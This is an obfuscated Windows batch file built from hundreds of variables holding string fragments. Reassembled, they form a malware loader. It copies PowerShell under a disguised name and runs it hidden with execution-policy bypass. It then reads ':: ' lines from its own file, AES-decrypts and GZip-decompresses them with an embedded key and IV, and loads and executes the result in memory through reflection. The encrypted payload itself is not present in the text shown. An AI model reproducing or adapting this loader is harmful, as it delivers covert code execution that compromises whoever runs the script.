@echo off
set "wrPILMWmBs=TllA"
set "GYkDPtWWFl=pStr"
set "beHvkqXAJo=[Sys"
set "MpfsNVWNje=oin "
set "HfGUCFlaAc== [S"
set "BJpehkoJnr=] -j"
set "GYzIZfIFaB=rofi"
set "HbmfVqrWTR=zuZI"
set "aYjnReoLhg=l5E7"
set "tNaKTuRaRA= [Sy"
set "TBqTSBJilN=File"
set "FPQdoskQqq=ck($"
set "cqyVrqojai=s75K"
set "IughiVumAX=]::("
set "kwDXRWjuyB=:: '"
set "KLZyIgjOIO=rtS4"
set "HpretijxBu=ewLi"
set "xQFKJpgRbj=)) {"
set "GMORwHzUoi=();$"
set "rLRWOMOBiL=eMVs"
set "xAZhpATGSu=hgPR"
set "BaQlmndjeL==');"
set "TQZQyleRNc=Fina"
set "SxbkApOEaW= if "
set "NYlPpzjlry=[IO."
set "chwXuijESn= = N"
set "QlfUuAuYIh=$ory"
set "hEQOVnJZDt=ryYk"
set "JOqAWyceJn=ose("
set "rZtEgCSJwp=[Sys"
set "WQzSOOKnvu=esaB"
set "XdIxdSnJkD=nb.T"
set "kLpbwWqLgv= '')"
set "LwBQVKGQGE= [Sy"
set "SYPYtGlxtK=grap"
set "OuRGsNaipy=pres"
set "cTdxMWMvGf=PR.T"
set "NESawdOxBS=tem."
set "HccmvAoshp= [st"
set "owLiHKbpnS=-1.."
set "opzJLqYQHF=$jjA"
set "FzsipSSzxf=ViRT"
set "ZDXKXJNeXG=.Cry"
set "ThnIJeVbER=oryY"
set "kdgwQzPzbO=tem."
set "mbtUcWqZwF=PTtG"
set "VnKGqYKUrP=..-1"
set "bGPNRkZbFy=eP.I"
set "aPNOsfEjSM=($fG"
set "hzhhCTWKdJ=gsYZ"
set "rhzZrtrJmj=ew-O"
set "UVoIvoBgSB=saBm"
set "obnMAHCXZx=pTrc"
set "NwOwpkZOOa=Comp"
set "pmFfuFaZQr=6] -"
set "FmHGjyDEDZ=pose"
set "bTywNyPATd=m.Re"
set "BSSxibtqkj=join"
set "ZXWtSuVFqR=stem"
set "lSAzSwhjwt=em.I"
set "gXMlUHmvly=);$N"
set "GGnqLnfWjD=16] "
set "khzcZEPjyv=oryY"
set "LhgTJJxxCg=flec"
set "lmYgXWgpWA=pher"
set "dYwdMVXiqj=.Cry"
set "UaWxxIJCUG=jjAA"
set "HRwvnWveWa=ispo"
set "wyYJTUpbzP=;$FE"
set "kbrwtnQNDZ=daeR"
set "YblrHaANCX=em.C"
set "VUTHfZYYHD=Disp"
set "alQcXfmclm=gjYA"
set "YwRttHlIzd=n.En"
set "HpCrNupfFn=tS46"
set "IjyXBHvhdu=$ory"
set "bCyHFUckEs=trea"
set "iNJwqdQhFX=nirt"
set "QdhWhZAkYI=rity"
set "GbmmwKUjOK=Iq ="
set "xXTsTXXZDP='[-1"
set "euMndSkztQ=iRT."
set "obEFWZIIYs=Conv"
set "KpxUhTCIBf=oint"
set "lXLlbAuofm=sVo "
set "vqPxHThZqh=Disp"
set "eisowjgVnd=oArr"
set "pdHhiTYncO=ssn "
set "yifBgbsjMG=gth)"
set "zbALTgfZPT=Aq.D"
set "wIqZrzZCLJ=1] -"
set "GIAnaOSUoM=n ''"
set "TERtMmUwQp=bypa"
set "yxPapZfzdt=ct S"
set "VvRghQwblc=)($j"
set "HpDPrkVHQO=Obje"
set "DUouzSZvAD=yste"
set "RyekbsgFyU=rt]:"
set "XlZhxVpiHP=$MXh"
set "psRbzqVHkU=ptog"
set "xJrWpXuIzb=F'[-"
set "bOHxudPBRm=ode]"
set "QcoCBvqZtQ=morF"
set "FCuxzokJcH=Comp"
set "JqsjLCgZyJ=brea"
set "ThLuoMqrQi=tion"
set "UOhHTJjkgq=ion."
set "ArZfWsFwxE='txe"
set "CZznYdumyp=).Sp"
set "BPOFsUHVYE=$Rhg"
set "epyrrkCide=; };"
set "ECnCMDOLPo=PR);"
set "NzuPmwAvNS=.Dis"
set "CRFJhJrIIk=q) {"
set "mKAgmpvWiO=nage"
set "RMhuJZpebX=ing("
set "ZSuMLODFmX=3); "
set "MwKcjznPxm=Mode"
set "ZFAlUMTrdA=jAAq"
set "tZJmZJDqjz=am;$"
set "tByqQRIPwH=le  "
set "wkWxXYLHHq=O.Me"
set "HcUJKmMhxI=ach "
set "LFELOCjdtA=1..-"
set "BUYJPXYtDB=ert]"
set "TEjHakwfez=ring"
set "YbNLFnclep=-joi"
set "OOCYZARfSY=m.IO"
set "BchHECuSdX=:('g"
set "vQdagaKUpY=();$"
set "TqGsrZsJuV=Yk ="
set "uwhxIOJgas=.Con"
set "XQrZnNkUYE=d;$N"
set "WoEvrgYFIV=oryS"
set "QGPSBksOYo=('Tg"
set "pMpRVwUVtb=k = "
set "cMXKGkVkpA=Iass"
set "MUHKFJzdfE=PKCS"
set "kzgnZJURbP=sion"
set "pSAlajqFGf=ddin"
set "OPgNkAitoQ=tsWi"
set "LpVquUSFTA=comp"
set "IcpLchmChy=, (,"
set "HvZvPOOMWn=$pTr"
set "CBkpAuuApr=o.Su"
set "GiiJTUByTm=PxEW"
set "iADpiaqZpM=6esa"
set "atsRVQvdSd=[Sys"
set "kRfnwiZJHg=Stre"
set "YdgwFxTrcX=ress"
set "xPWVHwTevP=rcF."
set "FuCOdnzabc=.-16"
set "CemQRkmoiR=ment"
set "mBOxaCYUoP=ress"
set "pUvUptZJGr=::De"
set "uBdiTYgapW=);$N"
set "BetSnXbUeX=Yk);"
set "vjCxrQhfPH=tryP"
set "LbovlOjbQW=qleP"
set "TAOgyGIDNq=Syst"
set "dNtCAWGCcf='gni"
set "wvXyxCClWz='[-1"
set "jahgXiTcLO=k, 0"
set "UhVZnhIxeG=ypto"
set "ExcNVxpATo=ecry"
set "UyNCPGuhqO=.Sec"
set "EvpxniBReh=qleP"
set "xBCzjFIJgf=.Len"
set "WvkmGkmcds=iron"
set "OesfMeimwQ=;$Ia"
set "ZginnzlkDY=)($o"
set "RxyVuNxKup=TQDr"
set "XlKiNcynmm=k = "
set "yqlkSdcFyV=ne);"
set "yzqhmKwVSw=raph"
set "nlVBuioLJt=y.Cr"
set "NwccAboOAk=);$j"
set "eDxbNZMidC=-ep "
set "yUhkRcIOuz= New"
set "LuTMSTvTEH=-Obj"
set "jkLQgtDgqs=lBlo"
set "mRlAdkvdYw=]::C"
set "XGgFEEYUgC=Obje"
set "SSOhLdluba=vert"
set "jQOSJlBjkq=BC;$"
set "dpLOQYWhYQ=join"
set "DgZsKgSwJt=Nqle"
set "dhMINVWeit=L4Yi"
set "DFkLYJBmtH= = ["
set "shVdYgbyvs=fore"
set "KvMoGFPani=bjec"
set "vlHxHmhaLA=qleP"
set "aMLkhKfqys=ptor"
set "GeeIBtDVCT=$Rhg"
set "DcKrXnpRZM== $N"
set "owjtGxLZkH=$FEq"
set "TGNEQXPkIE=qleP"
set "cSIfiqclry= = $"
set "AQbNJOYgoJ=-nop"
set "iowpfFveUu=[Env"
set "aWHHfPYqkP=oryY"
set "eMSpOTTXpF=Star"
set "wPeCEcZmRT=dj0C"
set "QuUkiFfJbP=q = "
set "AzCKRDatYz=.Mem"
set "adwevsljVn=TQDr"
set "fmEmJpfsad=sVo."
set "ERWoBxzTnG=zHhH"
set "QfDYpZAbzk=gnir"
set "vPuLQnDjht=]::N"
set "BsKvxUhehb=y]::"
set "cyLsJEBZWH=CFxo"
set "RKKGiNbjcC= '')"
set "bnBxibXcgb=ryYk"
set "VGFfSQevYX=ct S"
set "ItSqKgaVKp===')"
set "jGfBMtNHLG=ateD"
set "pzCcBtVSsC=]::("
set "siqJHUiFMe=urit"
set "gQHsTzuImN=F = "
set "fDgtgNZFqL=ke($"
set "CiHfwBKMtO=rity"
set "BYZBzqaMmd=[-1."
set "GCcfVsbwxp=-4] "
set "rUiQVCuhKT=MXhI"
set "FwZUmmfgNL=t Sy"
set "VwskfFSPBk=th('"
set "TDiYFlGMom=mory"
set "AdrzrVISsX=ddin"
set "IPlXYNBPsj=);$Z"
set "WJnpsJRZnQ=$Nql"
set "sJxXUlnrvA=esMa"
set "QLhxquxTGH=embl"
set "RaVomSdBfX=PR ="
set "XXjlMWrmpA=RmAx"
set "qIOwdkdZqp=onve"
set "JcJmvrOUqy=($fG"
set "TTvqCLDhUG=);$R"
set "FkZrAADyCB=ress"
set "kFyQpbKCtE=New-"
set "KySnrCmalX=.Com"
set "YdFgJfSTQX=g = "
set "ldbfzZFKjB=..-1"
set "tESRhNYfwC=form"
set "nngtTUjDkI=stem"
set "jinotYsKWR=ss -"
set "dLLKNOGkhe=.Ass"
set "kkIqnlNZpR=.Cop"
set "PdgmKzEaZz=y.Pa"
set "LZfrSlpCxG=cF, "
set "HYhTryiHZl=-joi"
set "EtJiFLsoDv=lit("
set "UTanMLMBdp=n ''"
set "OChbFnLIfo=stem"
set "uwFdpfzlGO=Bmor"
set "BapgNcvbao=raph"
set "hMdkiIuHji=  $j"
set "BDMpqZQmCr=yste"
set "giKHEcByUa=comm"
set "GaAKsPuPFB=k; }"
set "QStpDqDjQo=null"
set "VVScdnRVig=rans"
set "MEEJiyjsKm=Syst"
set "EOGSwSJVto='0Pg"
set "XHkWhGaoMA=;$ZV"
set "yadMumbRuq=Secu"
set "hZGfJfcbdX=.GZi"
set "onOukVkcub=tem."
set "zWhctmmErZ=e]::"
set "sTcTyuGQOL=.Mod"
set "QoKoZsKySN=qleP"
set "jSPdWdaWCg=, $o"
set "qNUMseRHAP= = $"
set "hKbiNwvBzG=in $"
set "nQIBXICwwy=yste"
set "zbNrdxstOj=fGsV"
set "uNoXtDcCIG=;$pT"
set "vkcuuAWaqp=S46e"
set "WaDuAAJcOp=m.IO"
set "nzrqjBiGtv=::('"
set "BgutMXInWV=106u"
set "eOhYRcourZ=[]] "
set "WLoHsLvRTD=.Key"
set "eZzyPVyKXV=;$FE"
set "nPUOVvIhpT='')("
set "cnqyqiaoeU=oL'["
set "GdCymdJqpK=gMod"
set "zIHJDomSQs=yTo("
set "ZbaBWTTVZW=New-"
set "NUWRaGmeAV=ptog"
%wMdTKEDCBc%%mopqxglIha%%EQLOgFmXab%%tLAjifemem%%GGYydtKbVg%%OnbQpGaoMf%%sGCzIAOghr%%cYDUuXSmKN%%UkcTngKKUC%%ePAYUZeyPD%%FEUDePJgvr%%NOEZliDImC%%QelFnmyEau%%TuwgiqqzPy%%wDoDOqlBNL%%wvmnNAspqS%%qfgaxtrxRU%%SeTNfmPIQW%%bXQoYxhjtH%%YbiXirxofv%%ZNKTSsCziA%%LJytQtoRba%%liejWRVVEN%%PBCuWonXvG%%VIaSWoCPgP%%dFmfjRIAXb%%wGUvLjgdwC%%gqwvfDhlnH%%pgPPJjoxlf%%FMaujoOFgM%%hysDINjRaG%%JxmpLqReLC%%VJSrXtpblQ%"%~dp0%~nx0.exe"
cls
%RnNnQOWNrS%%LfctlteQvS%
"%~nx0.exe" %AQbNJOYgoJ%%GYzIZfIFaB%%tByqQRIPwH%%eDxbNZMidC%%TERtMmUwQp%%jinotYsKWR%%giKHEcByUa%%tzBxIOKfDD%%XlZhxVpiHP%%GbmmwKUjOK%%LwBQVKGQGE%%nngtTUjDkI%%NtQftrnpaY%%TBqTSBJilN%%pzCcBtVSsC%%ArZfWsFwxE%%wrPILMWmBs%%kbrwtnQNDZ%%wvXyxCClWz%%VnKGqYKUrP%%wIqZrzZCLJ%%BSSxibtqkj%%kLpbwWqLgv%%DWwOCNeXgY%%CZznYdumyp%%EtJiFLsoDv%%iowpfFveUu%%WvkmGkmcds%%CemQRkmoiR%%vPuLQnDjht%%HpretijxBu%%yqlkSdcFyV%%shVdYgbyvs%%HcUJKmMhxI%%aPNOsfEjSM%%lXLlbAuofm%%hKbiNwvBzG%%rUiQVCuhKT%%CRFJhJrIIk%%SxbkApOEaW%%JcJmvrOUqy%%fmEmJpfsad%%eMSpOTTXpF%%OPgNkAitoQ%%VwskfFSPBk%%kwDXRWjuyB%%xQFKJpgRbj%%hMdkiIuHji%%adwevsljVn%%qNUMseRHAP%%zbNrdxstOj%%CBkpAuuApr%%dXVOTuRrSe%%RMhuJZpebX%%ZSuMLODFmX%%JqsjLCgZyJ%%GaAKsPuPFB%%epyrrkCide%%QlfUuAuYIh%%TqGsrZsJuV%%tNaKTuRaRA%%ZXWtSuVFqR%%uwhxIOJgas%%SSOhLdluba%%IughiVumAX%%dNtCAWGCcf%%KLZyIgjOIO%%iADpiaqZpM%%uwFdpfzlGO%%xJrWpXuIzb%%LFELOCjdtA%%GGnqLnfWjD%%HYhTryiHZl%%GIAnaOSUoM%%VvRghQwblc%%RxyVuNxKup%%uBdiTYgapW%%vlHxHmhaLA%%chwXuijESn%%rhzZrtrJmj%%KvMoGFPani%%FwZUmmfgNL%%OChbFnLIfo%%UyNCPGuhqO%%siqJHUiFMe%%nlVBuioLJt%%UhVZnhIxeG%%SYPYtGlxtK%%fgWaaJCmhH%%sJxXUlnrvA%%mKAgmpvWiO%%XQrZnNkUYE%%EvpxniBReh%%sTcTyuGQOL%%nFetKCsxKh%%atsRVQvdSd%%NESawdOxBS%%gugnrZrVNL%%QdhWhZAkYI%%ZDXKXJNeXG%%NUWRaGmeAV%%yzqhmKwVSw%%CDzTTDwwqI%%lmYgXWgpWA%%MwKcjznPxm%%mRlAdkvdYw%%jQOSJlBjkq%%DgZsKgSwJt%%qGYevubxcN%%AdrzrVISsX%%YdFgJfSTQX%%rZtEgCSJwp%%kdgwQzPzbO%%yadMumbRuq%%CiHfwBKMtO%%dYwdMVXiqj%%psRbzqVHkU%%BapgNcvbao%%PdgmKzEaZz%%pSAlajqFGf%%GdCymdJqpK%%zWhctmmErZ%%MUHKFJzdfE%%MPuVIMAHaH%%QoKoZsKySN%%WLoHsLvRTD%%DFkLYJBmtH%%MEEJiyjsKm%%YblrHaANCX%%qIOwdkdZqp%%RyekbsgFyU%%BchHECuSdX%%iNJwqdQhFX%%vkcuuAWaqp%%UVoIvoBgSB%%QkVsgdOHUX%%BYZBzqaMmd%%FuCOdnzabc%%BJpehkoJnr%%MpfsNVWNje%%nPUOVvIhpT%%EOGSwSJVto%%cqyVrqojai%%rLRWOMOBiL%%BgutMXInWV%%mbtUcWqZwF%%hzhhCTWKdJ%%dhMINVWeit%%HbmfVqrWTR%%wPeCEcZmRT%%aYjnReoLhg%%alQcXfmclm%%BaQlmndjeL%%WJnpsJRZnQ%%bGPNRkZbFy%%PXbEraiXaE%%beHvkqXAJo%%onOukVkcub%%obEFWZIIYs%%BUYJPXYtDB%%nzrqjBiGtv%%QfDYpZAbzk%%HpCrNupfFn%%WQzSOOKnvu%%QcoCBvqZtQ%%xXTsTXXZDP%%ldbfzZFKjB%%pmFfuFaZQr%%dpLOQYWhYQ%%RKKGiNbjcC%%QGPSBksOYo%%XXjlMWrmpA%%cyLsJEBZWH%%ERWoBxzTnG%%GiiJTUByTm%%vOTCzrUxiW%%ItSqKgaVKp%%wyYJTUpbzP%%ddfJlPXuPj%%DcKrXnpRZM%%TGNEQXPkIE%%cSXtSFnifV%%jGfBMtNHLG%%ExcNVxpATo%%aMLkhKfqys%%ahMdDnAmSw%%khzcZEPjyv%%pMpRVwUVtb%%owjtGxLZkH%%XdIxdSnJkD%%VVScdnRVig%%tESRhNYfwC%%TQZQyleRNc%%jkLQgtDgqs%%FPQdoskQqq%%ThnIJeVbER%%jahgXiTcLO%%jSPdWdaWCg%%bnBxibXcgb%%xBCzjFIJgf%%yifBgbsjMG%%eZzyPVyKXV%%kRVKqHqqUq%%vqPxHThZqh%%JOqAWyceJn%%gXMlUHmvly%%LbovlOjbQW%%NzuPmwAvNS%%FmHGjyDEDZ%%GMORwHzUoi%%obnMAHCXZx%%gQHsTzuImN%%kFyQpbKCtE%%XGgFEEYUgC%%VGFfSQevYX%%nQIBXICwwy%%WaDuAAJcOp%%AzCKRDatYz%%WoEvrgYFIV%%bCyHFUckEs%%gcHIxNoXJt%%IjyXBHvhdu%%BetSnXbUeX%%BPOFsUHVYE%%RaVomSdBfX%%yUhkRcIOuz%%LuTMSTvTEH%%aAjzDAifGv%%TAOgyGIDNq%%lSAzSwhjwt%%wkWxXYLHHq%%TDiYFlGMom%%kRfnwiZJHg%%tZJmZJDqjz%%UaWxxIJCUG%%QuUkiFfJbP%%ZbaBWTTVZW%%HpDPrkVHQO%%yxPapZfzdt%%DUouzSZvAD%%OOCYZARfSY%%KySnrCmalX%%OuRGsNaipy%%kzgnZJURbP%%hZGfJfcbdX%%GYkDPtWWFl%%zIQuNkrFnH%%HvZvPOOMWn%%LZfrSlpCxG%%NYlPpzjlry%%NwOwpkZOOa%%FkZrAADyCB%%UOhHTJjkgq%%FCuxzokJcH%%mBOxaCYUoP%%WKJPEZphCF%%bOHxudPBRm%%pUvUptZJGr%%LpVquUSFTA%%YdgwFxTrcX%%NwccAboOAk%%ZFAlUMTrdA%%kkIqnlNZpR%%zIHJDomSQs%%GeeIBtDVCT%%ECnCMDOLPo%%opzJLqYQHF%%zbALTgfZPT%%HRwvnWveWa%%AAdCdqEvXk%%uNoXtDcCIG%%xPWVHwTevP%%VUTHfZYYHD%%BKcEzUDzbK%%TTvqCLDhUG%%xAZhpATGSu%%EeUffNNswM%%TucLVcyDet%%vQdagaKUpY%%aWHHfPYqkP%%XlKiNcynmm%%bqCyYOaTYf%%cTdxMWMvGf%%eisowjgVnd%%CwHcXKujIr%%OesfMeimwQ%%pdHhiTYncO%%HfGUCFlaAc%%BDMpqZQmCr%%bTywNyPATd%%LhgTJJxxCg%%ThLuoMqrQi%%dLLKNOGkhe%%QLhxquxTGH%%BsKvxUhehb%%ixKLZawvgU%%cnqyqiaoeU%%owLiHKbpnS%%GCcfVsbwxp%%YbNLFnclep%%UTanMLMBdp%%ZginnzlkDY%%hEQOVnJZDt%%IPlXYNBPsj%%FzsipSSzxf%%cSIfiqclry%%cMXKGkVkpA%%YwRttHlIzd%%vjCxrQhfPH%%KpxUhTCIBf%%XHkWhGaoMA%%euMndSkztQ%%cPuHPIYXmA%%fDgtgNZFqL%%QStpDqDjQo%%IcpLchmChy%%HccmvAoshp%%TEjHakwfez%%eOhYRcourZ%%AwyRdNQgTc%%ckcAueTHKS%
exit /b
